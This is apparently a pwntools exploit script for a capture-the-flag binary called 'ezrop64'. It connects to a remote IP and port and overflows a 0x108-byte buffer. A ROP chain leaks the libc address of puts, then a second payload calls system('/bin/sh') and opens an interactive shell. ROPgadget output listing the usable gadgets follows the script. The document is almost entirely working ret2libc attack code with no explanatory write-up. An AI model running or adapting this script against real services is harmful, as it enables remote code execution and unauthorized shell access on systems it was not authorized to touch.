from pwn import *
context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])



# io=process("./ezrop64")
io=remote("43.142.108.3",28945)
elf=ELF("./ezrop64")
libc=ELF("./libc.so.6")
pop_rdi_ret=0x4012a3
puts_plt=elf.plt[b"puts"]
puts_got=elf.got[b"puts"]
vuln=0x401186
ret=0x40101a 
payload=cyclic(0x108)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
io.sendlineafter("rop.\n",payload)
libc_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-libc.sym[b"puts"]
print("libc_addr:  "+hex(libc_addr))
sys_addr=libc_addr+libc.sym[b"system"]
str_bin_sh=libc_addr+next(libc.search(b"/bin/sh"))

payload=cyclic(0x108)+p64(ret)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.sendlineafter("rop.\n",payload)

io.interactive()







# Gadgets information
# ============================================================
# 0x0000000000401166 : mov byte ptr [rip + 0x2efb], 1 ; pop rbp ; ret
# 0x0000000000401237 : mov eax, 0 ; pop rbp ; ret
# 0x000000000040129c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040129e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012a0 : pop r14 ; pop r15 ; ret
# 0x00000000004012a2 : pop r15 ; ret
# 0x000000000040129b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040129f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040116d : pop rbp ; ret
# 0x00000000004012a3 : pop rdi ; ret
# 0x00000000004012a1 : pop rsi ; pop r15 ; ret
# 0x000000000040129d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 13